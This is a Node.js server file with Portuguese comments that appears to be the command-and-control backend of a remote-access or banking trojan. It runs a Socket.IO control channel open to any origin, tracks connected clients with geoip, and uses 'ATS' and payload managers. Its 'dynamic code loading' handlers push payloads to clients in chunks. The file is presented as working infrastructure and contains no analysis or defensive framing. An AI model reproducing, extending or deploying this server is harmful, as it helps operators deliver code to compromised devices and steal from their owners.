const express = require("express"),
  app = express(),
  IO = require("socket.io"),
  geoip = require("geoip-lite"),
  fs = require("fs"),
  https = require("https"),
  cookieParser = require("cookie-parser"),
  CONST = require("./config/const"),
  db = require("./database/db"),
  logManager = require("./utils/logManager"),
  clientManager = new (require("./utils/clientManager"))(db),
  atsManager = new (require("./utils/atsManager"))(db),
  payloadManager = new (require("./utils/payloadManager"))(db);

// ==================== HTTPS CONFIGURATION ====================
const options = {
  key: fs.readFileSync(CONST.ssl_key_path),
  cert: fs.readFileSync(CONST.ssl_cert_path),
};

const httpsServer = https.createServer(options);

// ==================== SOCKET.IO SOBRE HTTPS ====================
let client_io = IO(httpsServer, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"],
  },
});

client_io.sockets.pingInterval = 30000;

client_io.on("connection", (socket) => {
  // Handler existente
  socket.emit("welcome");
  // ...

  // ==================== HANDLERS PARA DYNAMIC CODE LOADING ====================
  socket.on("request_payload", (data) => {
    const { clientId, payloadId } = data;
    const payload = payloadManager.getPayload(payloadId);
    
    if (payload) {
      socket.emit("payload_chunk", {
        id: payloadId,
        chunk: payload.chunk,
        totalChunks: payload.totalChunks,
        currentChunk: payload.currentChunk
      });
      
      // Enviar próximo chunk
      setTimeout(() => {
        payloadManager.sendNextChunk(socket, payloadId);
      }, 1000);
    } else {
      socket.emit("payload_error", { error: "Payload not found" });
    }
  });
  
  socket.on("payload_received", (data) => {
    const { clientId, payloadId, status } = data;
    
    if (status === "complete") {
      payloadManager.markPayloadComplete(payloadId);
      socket.emit("payload_status", {
        payloadId,
        status: "processed"
      });
    }
  });
});

// Inicia servidor HTTPS
httpsServer.listen(CONST.control_port, () => {
  console.log(`[HTTPS] Socket.IO rodando na porta ${CONST.control_port}`);
});

// ==================== CONFIGURAÇÃO DO EXPRESS ====================
app.disable("x-powered-by");
app.set("trust proxy", 1);
app.set("view engine", "ejs");
app.set("views", __dirname + "/assets/views");
app.use(express.static(__dirname + "/assets/webpublic"));
app.use(cookieParser());

// **IMPORTANTE**: Define o app global ANTES de carregar as rotas
global.app = app;
global.CONST = CONST;
global.db = db;
global.logManager = logManager;
global.clientManager = clientManager;
global.atsManager = atsManager;
global.payloadManager = payloadManager;

// Carrega as rotas depois de definir o global.app
app.use(require("./routes/index"));

// ==================== SERVIDOR WEB EM HTTPS ====================
const webHttpsServer = https.createServer(options, app);

webHttpsServer.listen(CONST.web_port, () => {
  console.log(`[HTTPS] Interface rodando na porta ${CONST.web_port}`);
});